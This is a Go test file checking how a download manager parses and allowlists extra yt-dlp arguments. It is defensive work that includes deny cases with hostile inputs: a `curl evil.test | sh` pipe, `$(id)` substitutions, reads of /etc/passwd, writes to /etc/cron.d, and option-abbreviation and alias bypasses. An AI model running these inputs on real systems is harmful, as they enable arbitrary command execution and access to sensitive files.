package ipc

import (
	"os/exec"
	"strings"
	"sync"
	"testing"
)

func TestParseExtraArgsQuoting(t *testing.T) {
	cases := []struct {
		raw  string
		want []string
	}{
		{"", nil},
		{"--limit-rate 1M", []string{"--limit-rate", "1M"}},
		{"  --retries   10  ", []string{"--retries", "10"}},
		{`--user-agent "Mozilla 5.0 (X11)"`, []string{"--user-agent", "Mozilla 5.0 (X11)"}},
		{`--add-header 'X-Test: a b'`, []string{"--add-header", "X-Test: a b"}},
		{`--format-sort "res:1080,codec:av01"`, []string{"--format-sort", "res:1080,codec:av01"}},
		{`--proxy socks5://127.0.0.1:1080`, []string{"--proxy", "socks5://127.0.0.1:1080"}},
		{`--sleep-requests=1.5`, []string{"--sleep-requests=1.5"}},
	}
	for _, tc := range cases {
		got, err := ParseExtraArgs(tc.raw)
		if err != nil {
			t.Errorf("ParseExtraArgs(%q) errored: %v", tc.raw, err)
			continue
		}
		if strings.Join(got, "\x00") != strings.Join(tc.want, "\x00") {
			t.Errorf("ParseExtraArgs(%q) = %q, want %q", tc.raw, got, tc.want)
		}
	}
}

// TestParseExtraArgsPerformsNoExpansion: the tokens go to exec without a
// shell, so shell metacharacters must survive as literal text rather than
// being interpreted by anything at any point.
func TestParseExtraArgsPerformsNoExpansion(t *testing.T) {
	got, err := ParseExtraArgs(`--add-header "X: $(id)" --add-header 'Y: ` + "`id`" + `' --referer Z:$HOME`)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"--add-header", "X: $(id)",
		"--add-header", "Y: `id`",
		"--referer", "Z:$HOME",
	}
	if strings.Join(got, "\x00") != strings.Join(want, "\x00") {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestParseExtraArgsRejectsMalformedInput(t *testing.T) {
	bad := []string{
		`--user-agent "unclosed`,
		"--add-header X:\nY",     // a newline could forge a protocol line
		"--add-header X:\x1b[0m", // terminal escape
		strings.Repeat("a", MaxExtraArgsLen+1),
		strings.Repeat("-x ", MaxExtraArgTokens+1),
	}
	for _, raw := range bad {
		if _, err := ParseExtraArgs(raw); err == nil {
			t.Errorf("ParseExtraArgs(%.40q) was accepted", raw)
		}
	}
}

// TestExtraArgsRefusesEverythingNotAllowlisted is the security test for the
// feature. The cases are grouped by the way each one would escape if the check
// were a list of forbidden spellings instead of a list of permitted ones.
func TestExtraArgsRefusesEverythingNotAllowlisted(t *testing.T) {
	denied := map[string][]string{
		"runs a command": {
			`--exec "curl evil.test | sh"`,
			"--exec=touch /tmp/pwned",
			"--exec-before-download id",
			"--netrc-cmd 'sh -c id'",
			"--downloader /bin/sh",
			"--external-downloader /bin/sh",
			"--downloader-args x",
			"--postprocessor-args ffmpeg:-f null /etc/x",
			"--ffmpeg-location /tmp/evil-ffmpeg",
			"--use-postprocessor Evil",
		},
		// yt-dlp accepts unambiguous abbreviations, so a refusal list keyed on
		// full spellings is bypassed by typing fewer characters. Verified
		// against the real binary: "--qui" reaches --quiet, "--outpu" reaches
		// --output.
		"abbreviation of a dangerous option": {
			"--qui",
			"--outpu /etc/cron.d/x",
			"--exe id",
			"--plugin-dir /tmp/plugins",
			"--config-locatio /tmp/evil.conf",
			"--postprocessor-arg x",
		},
		// --alias defines a new option that expands to arbitrary others, and
		// yt-dlp strips leading whitespace from the expansion, so a body that
		// looks like a harmless value is not one.
		"defines new options": {
			`--alias --x " --exec id"`,
			"--alias --y --exec",
		},
		"loads code or configuration": {
			"--plugin-dirs /tmp/plugins",
			"--config-location /tmp/evil.conf",
			"--config-locations /tmp/evil.conf",
			"--ignore-config",
			"--js-runtimes node:/tmp/evil",
		},
		"reads or writes chosen paths": {
			"-o /etc/cron.d/x",
			"--output /etc/cron.d/x",
			"--paths /etc",
			"--print-to-file x /etc/x",
			"--batch-file /etc/passwd",
			"--cookies /tmp/jar.txt",
			"--cookies-from-browser firefox",
			"--download-archive /tmp/archive.txt",
			"--cache-dir /tmp/cache",
			"--rm-cache-dir",
			"--home /tmp",
		},
		"breaks the manager's own output parsing": {
			"--print filename",
			"--progress-template x",
			"--quiet",
			"--verbose",
			"--dump-json",
			"--simulate",
			"--skip-download",
			"--list-formats",
			"--newline",
		},
		"changes the installation": {"--update", "--update-to nightly", "--version"},
		// Skipping a download exits 0 with no file, and error masking reports
		// success over a failed post-process: both would mark an entry
		// completed with no media behind it. Verified against the real binary:
		// --match-filters with a non-matching filter prints nothing, exits 0.
		"can skip a download or mask a failure": {
			"--match-filters id=nope", "--break-match-filters id=nope",
			"--min-filesize 1G", "--max-filesize 1K", "--date 20200101",
			"--datebefore 20200101", "--dateafter 20200101", "--age-limit 0",
			"--ignore-errors", "--no-abort-on-error", "--break-on-existing",
			"--max-downloads 1",
		},
		// The manager expands playlists itself, so these shape nothing by the
		// time the download runs — they would silently do nothing.
		"tries to shape a playlist the manager already expanded": {
			"--no-playlist", "--yes-playlist", "--playlist-items 1:5",
			"--playlist-random", "--lazy-playlist",
		},
		// Credentials would be persisted in the state file and echoed by the
		// API, so they are not accepted even though they are otherwise benign.
		"carries a credential": {
			"--username alice --password hunter2",
			"--video-password s3cret",
			"--ap-password s3cret",
			"--netrc",
		},
		// A bare word is a URL to yt-dlp: it would download something the
		// queue never validated, counted, or tracked.
		"smuggles a URL or stray value": {
			"https://evil.test/video",
			"--limit-rate 1M https://evil.test/video",
			"--enable-file-urls file:///etc/passwd",
			"-- --exec id",
		},
		// Short flags can bundle, which is another way to hide a letter.
		"uses a short flag": {"-q", "-qv", "-U", "-o /tmp/x", "-4"},
	}
	for reason, cases := range denied {
		for _, raw := range cases {
			if _, err := ExtraArgs(raw); err == nil {
				t.Errorf("ExtraArgs(%q) was accepted — it %s", raw, reason)
			}
		}
	}
}

// TestExtraArgsAllowsOrdinaryDownloadOptions: the guard must not be so broad
// that the field stops being useful. These are the reasons someone asks for
// extra arguments in the first place.
func TestExtraArgsAllowsOrdinaryDownloadOptions(t *testing.T) {
	allowed := []string{
		"--limit-rate 2M",
		"--retries 20 --fragment-retries 20",
		"--concurrent-fragments 4",
		"--proxy http://127.0.0.1:8118",
		"--geo-bypass-country DE",
		`--user-agent "Mozilla/5.0"`,
		`--add-header "Referer: https://example.test/"`,
		"--format-sort res:1080,codec:av01",
		"--embed-thumbnail --embed-metadata",
		"--sponsorblock-remove sponsor",
		"--throttled-rate 100K",
		"--source-address 10.0.0.5",
		"--sleep-interval 5 --max-sleep-interval 10",
		"--impersonate chrome",
		"--remux-video mkv",
		"--sub-langs en,de --write-subs",
		"--force-overwrites",
		"--sleep-requests=1.5",
	}
	for _, raw := range allowed {
		if _, err := ExtraArgs(raw); err != nil {
			t.Errorf("ExtraArgs(%q) was refused: %v", raw, err)
		}
	}
}

// TestExtraArgsErrorsExplainThemselves: a refusal has to name what it refused
// and point somewhere, or the field is unusable trial and error.
func TestExtraArgsErrorsExplainThemselves(t *testing.T) {
	_, err := ExtraArgs("--limit-rate 1M --exec id")
	if err == nil {
		t.Fatal("accepted --exec")
	}
	if !strings.Contains(err.Error(), "--exec") {
		t.Errorf("error %q does not name the refused option", err)
	}
	if !strings.Contains(err.Error(), "config file") {
		t.Errorf("error %q does not point at the escape hatch", err)
	}
}

func TestExtraArgsRequiresValuesForOptionsThatTakeThem(t *testing.T) {
	for _, raw := range []string{"--limit-rate", "--retries 10 --proxy", "--no-playlist="} {
		if _, err := ExtraArgs(raw); err == nil {
			t.Errorf("ExtraArgs(%q) was accepted with a missing or misplaced value", raw)
		}
	}
}

// TestAllowlistArityMatchesYtDlp guards the one thing the allowlist cannot
// check itself: whether each option really consumes a value. A wrong arity
// would let the token after an option go unexamined, which is precisely how a
// URL or a forbidden option would slip in.
func TestAllowlistArityMatchesYtDlp(t *testing.T) {
	if testing.Short() {
		t.Skip("spawns one yt-dlp per allowlisted option")
	}
	if _, err := exec.LookPath("yt-dlp"); err != nil {
		t.Skipf("yt-dlp not available: %v", err)
	}
	type result struct {
		name    string
		problem string
	}
	names := make(chan string)
	results := make(chan result)
	var wg sync.WaitGroup
	for range 8 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for name := range names {
				// With the option last and no value after it, yt-dlp reports a
				// missing argument exactly when the option takes one.
				out, _ := exec.Command("yt-dlp", "--ignore-config", name).CombinedOutput()
				text := string(out)
				needsValue := strings.Contains(text, "requires 1 argument") ||
					strings.Contains(text, "requires an argument")
				switch {
				case strings.Contains(text, "no such option"):
					results <- result{name, "is allowlisted but this yt-dlp does not have it"}
				case needsValue && allowedExtraArgs[name] == 0:
					results <- result{name, "takes a value but is allowlisted with arity 0"}
				case !needsValue && allowedExtraArgs[name] == 1:
					results <- result{name, "takes no value but is allowlisted with arity 1"}
				}
			}
		}()
	}
	go func() {
		for name := range allowedExtraArgs {
			names <- name
		}
		close(names)
		wg.Wait()
		close(results)
	}()
	for r := range results {
		t.Errorf("%s %s", r.name, r.problem)
	}
}

func TestOptionsCarryExtraArgs(t *testing.T) {
	o := Options{ExtraArgs: "  --limit-rate 1M  "}.Normalize()
	if o.ExtraArgs != "--limit-rate 1M" {
		t.Errorf("not trimmed: %q", o.ExtraArgs)
	}
	if err := o.Validate(); err != nil {
		t.Errorf("valid extra args refused: %v", err)
	}
	if o.Empty() {
		t.Error("options carrying extra args reported as empty")
	}
	if (Options{ExtraArgs: "--exec id"}).Validate() == nil {
		t.Error("per-download options accepted --exec")
	}
	// Two downloads asking for different arguments are different requests.
	if (Options{ExtraArgs: "--limit-rate 1M"}).Equal(Options{ExtraArgs: "--limit-rate 2M"}) {
		t.Error("different extra args compared equal")
	}
}

// TestProbeSafeArgs: a probe must inherit how to reach the site, and nothing
// that changes what gets downloaded. --max-downloads is the case that forced
// this: yt-dlp exits 101 after printing, which a probe reads as failure, so
// forwarding it stopped every affected download from ever starting.
func TestProbeSafeArgs(t *testing.T) {
	args, err := ExtraArgs(
		"--proxy http://127.0.0.1:8118 --user-agent Mozilla " +
			"--limit-rate 2M --add-header X-A:1 --impersonate chrome " +
			"--sleep-requests=1.5 --embed-thumbnail")
	if err != nil {
		t.Fatal(err)
	}
	got := strings.Join(ProbeSafeArgs(args), " ")
	want := "--proxy http://127.0.0.1:8118 --user-agent Mozilla --add-header X-A:1 " +
		"--impersonate chrome --sleep-requests=1.5"
	if got != want {
		t.Errorf("ProbeSafeArgs = %q\nwant             %q", got, want)
	}
}

// TestProbeSafeArgsNeverStrandsAValue: dropping an option must drop its value
// too, or the value would be left behind as a bare token — which yt-dlp reads
// as a URL.
func TestProbeSafeArgsNeverStrandsAValue(t *testing.T) {
	args, err := ExtraArgs("--remux-video mkv --retries 5 --sub-format best")
	if err != nil {
		t.Fatal(err)
	}
	kept := ProbeSafeArgs(args)
	if err := ValidateExtraArgs(kept); err != nil {
		t.Fatalf("filtered arguments no longer validate (%v): %q", err, kept)
	}
	for _, a := range kept {
		if a == "mkv" || a == "best" {
			t.Errorf("a dropped option's value survived: %q", kept)
		}
	}
}

// TestExtraArgsRefusesOptionsThatChangeTheExitStatus: yt-dlp exits 101 when it
// stops because of --max-downloads, which the manager reads as a failed
// download even though the file arrived complete. An option that can turn a
// success into a failure has no place on the list — a live run caught exactly
// that, with the file on disk and the row marked failed.
func TestExtraArgsRefusesOptionsThatChangeTheExitStatus(t *testing.T) {
	for _, raw := range []string{"--max-downloads 1", "--max-downloads=1"} {
		if _, err := ExtraArgs(raw); err == nil {
			t.Errorf("ExtraArgs(%q) was accepted", raw)
		}
	}
}
